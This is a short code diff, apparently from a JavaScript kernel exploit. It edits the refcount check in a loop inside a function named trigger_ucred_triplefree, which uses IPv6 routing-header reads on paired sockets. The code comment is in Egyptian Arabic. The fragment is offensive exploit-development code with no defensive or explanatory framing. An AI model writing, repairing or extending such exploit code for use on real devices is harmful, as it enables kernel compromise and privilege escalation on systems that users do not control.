@@ -1335,7 +1335,7 @@ function trigger_ucred_triplefree() {
       // دلوقتي بس نقرأ refcount
       write32(leak_rthdr.add(0x04), 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
-      if (read32(leak_rthdr.add(0x04)) === 1) break;
+      if (read32(leak_rthdr) === 1) break;
       count++;
     }
     if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
